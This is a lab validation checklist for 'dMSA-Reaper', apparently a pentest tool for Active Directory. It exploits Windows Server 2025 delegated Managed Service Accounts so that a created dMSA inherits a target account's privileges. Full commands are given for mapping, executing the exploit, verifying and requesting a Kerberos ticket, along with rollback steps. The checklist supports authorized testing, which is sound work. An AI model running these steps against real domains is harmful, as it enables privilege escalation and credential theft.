# dMSA-Reaper — Lab Validation Checklist

Use this checklist before first live-lab testing of a primitive and before any
authorized pentest engagement.

---

## 1. Domain prerequisites

| Requirement | Why |
|---|---|
| Windows Server 2025 DC (≥ one) | dMSA object class only exists on WS2025 schema |
| `msDS-DelegatedManagedServiceAccount` schema class present | Tool checks `has_dmsa_schema`; map will report `dmsa_capable=False` otherwise |
| KDS root key configured | Required for gMSA/dMSA managed-password issuance |
| Test OU isolated from production objects | Limits blast radius; rollback targets this OU |
| Controlled low-priv test user (or computer account) | Operator account used by the tool |
| Target service account in the test OU | Account whose credentials the dMSA will inherit |
| Operator account has ≥ `CreateChild:msDS-DelegatedManagedServiceAccount` on test OU | Required for `legacy-oneway-link` / `postpatch-mutual-pair` |
| State.json written from a fresh `map` run | Stale state files cause false path classifications |

---

## 2. Validation sequence

Run each step in order. Stop and investigate before proceeding if any step fails.

### Step 1 — Map

```bash
dmsa-reaper map \
  --domain corp.local \
  --dc-ip 192.168.1.10 \
  --username testuser \
  --password 'P@ssw0rd' \
  --json state.json
```

Expected output:
```
wrote map state state.json
dmsa_capable=True
```

If `dmsa_capable=False`: the DC is not WS2025 or the schema class is missing.

---

### Step 2 — Enumerate paths

```bash
dmsa-reaper paths --state state.json
```

Expected output: a table showing at least one `postpatch-mutual-pair` or `legacy-oneway-link`
path with `Exec=yes` for the test OU and test target.

Note the path ID (e.g. `P-0001`) for the next step.

---

### Step 3 — Dry run

```bash
dmsa-reaper exploit \
  --path P-0001 \
  --state state.json \
  --target-dn "CN=svc,OU=TestOU,DC=corp,DC=local" \
  --dry-run
```

Expected output: a panel showing the exact CREATE and MODIFY operations planned,
with `msDS-DelegatedMSAState = 2` and the correct target DN. No LDAP writes occur.

---

### Step 4 — Execute (with confirmation)

```bash
dmsa-reaper exploit \
  --path P-0001 \
  --state state.json \
  --domain corp.local \
  --dc-ip 192.168.1.10 \
  --username testuser \
  --password 'P@ssw0rd' \
  --target-dn "CN=svc,OU=TestOU,DC=corp,DC=local" \
  --confirm
```

Expected output:
```
operation OP-0001 status=executed
  created dMSA : CN=dmsarpr-xxxxxx,OU=TestOU,DC=corp,DC=local
  sAMAccountName: dmsarpr-xxxxxx$
  target        : CN=svc,OU=TestOU,DC=corp,DC=local
```

Verify manually in AD that the dMSA object exists and carries the expected attributes:
```
msDS-DelegatedMSAState              = 2
msDS-ManagedAccountPrecededByLink   = CN=svc,...
```

---

### Step 5 — LDAP state verify

```bash
dmsa-reaper verify \
  --op OP-0001 \
  --mode ldap \
  --domain corp.local \
  --dc-ip 192.168.1.10 \
  --username testuser \
  --password 'P@ssw0rd'
```

Expected output:
```
mode=ldap verified=True
```

---

### Step 6 — External Kerberos validation (manual step)

Use an external Kerberos tool (Rubeus, getST.py, etc.) to request a service
ticket as the dMSA and verify that the PAC contains the target account's SID:

```bash
# Example with impacket getST.py (requires dMSA credentials or PKINIT):
python3 getST.py -spn cifs/fileserver.corp.local \
    -dc-ip 192.168.1.10 \
    corp.local/dmsarpr-xxxxxx$ \
    -no-pass -k
```

The tool does not implement native Kerberos credential retrieval.
Expected result: ticket issued, PAC includes target SID.

---

### Step 7 — Rollback

```bash
dmsa-reaper rollback \
  --op OP-0001 \
  --domain corp.local \
  --dc-ip 192.168.1.10 \
  --username testuser \
  --password 'P@ssw0rd'
```

Expected output:
```
operation OP-0001 status=rolled-back
```

Verify in AD that the dMSA object no longer exists and any target-side attributes
have been restored to their pre-exploit values.

---

### Step 8 — Post-rollback verify

```bash
dmsa-reaper verify \
  --op OP-0001 \
  --mode ldap \
  --domain corp.local \
  --dc-ip 192.168.1.10 \
  --username testuser \
  --password 'P@ssw0rd'
```

Expected output:
```
mode=ldap verified=False
```

`verified=False` is correct here: rollback cleared the LDAP state. `operation.verified` was
reset to `False` when rollback completed.

---

## 3. Failure handling checklist

Before any engagement run, confirm the following have been tested in the lab:

- [ ] `postpatch-mutual-pair` step 2 failure (simulate by revoking target write rights mid-run) → automatic rollback triggered, dMSA deleted
- [ ] `postpatch-mutual-pair` step 3 failure → same
- [ ] `existing-dmsa-postpatch-mutual` target-side failure → dMSA-side changes reversed
- [ ] Manual rollback via `dmsa-reaper rollback` after a completed exploit
- [ ] `verify --mode ldap` returns `True` after exploit and `False` after rollback
- [ ] `dmsa-reaper exploit --dry-run` shows no LDAP writes in DC audit log

---

## 4. Not implemented yet (engagement blockers)

The following must be resolved before using this tool in a paid pentest:

- Native Kerberos TGT/TGS retrieval (step 6 is manual)
- NT hash LDAP bind (current NTLM bind requires plaintext password or Kerberos ccache)
- `dacl-container-escalate` and `dacl-target-escalate` execution (marked `executable=False`)
- Multi-DC replication lag handling (verify may fail immediately after write on a different DC)
